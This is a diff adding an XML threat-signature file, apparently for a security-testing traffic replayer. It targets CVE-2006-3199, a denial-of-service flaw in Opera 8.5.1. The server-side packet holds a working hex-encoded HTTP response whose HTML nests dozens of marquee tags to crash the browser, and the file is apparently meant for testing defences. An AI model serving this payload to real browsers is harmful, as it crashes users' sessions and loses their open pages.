@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Opera Malicious HTML Processing Denial of Service Vulnerability"/>
+    <EngDesc display="true" value="This threat sends a malicious piece of html which will cause Opera web browsers to crash.  This can be used by a malicious attacker to force a user to lose all open webpages.  This threat mimics a webserver sending the malicious attack from the virtual server, and would typically be sent across port 80. "/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Opera_Software"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Opera_Software"/>
+      <item value="Opera_Web_Browser"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Opera_Software"/>
+      <item value="Opera_Web_Browser"/>
+      <item value="Opera_8.5.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.critical.lt/?vuln/349"/>
+    <CVEID display="true" value="CVE-2006-3199"/>
+    <bugtraqID display="true" value="18585"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="0000010c2350918500c000a80001003c1484b838"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633094937786597500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1173913910" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="C"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="F"/>
+      <for index="D"/>
+      <for index="G"/>
+      <for index="E"/>
+      <for index="C"/>
+    </for>
+    <for index="B">
+      <for index="F"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C203331204D617920323030362030323A34363A313320474D540D0A5365727665723A204170616368650D0A4C6173742D4D6F6469666965643A205765642C203331204D617920323030362030323A31353A323620474D540D0A455461673A20223562343639302D3561332D3166653930623830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20313434330D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0D0A3C68746D6C3E0D0A3C686561643E0D0A3C7469746C653E4A6162626572776F636B793C2F7469746C653E0D0A3C6D65746120687474702D65717569763D22436F6E74656E742D547970652220636F6E74656E743D22746578742F68746D6C3B20636861727365743D69736F2D383835392D31223E0D0A3C2F686561643E0D0A3C626F64793E0D0A3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E3C2F6D6172717565653E0D0A3C2F626F64793E0D0A3C2F68746D6C3E0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
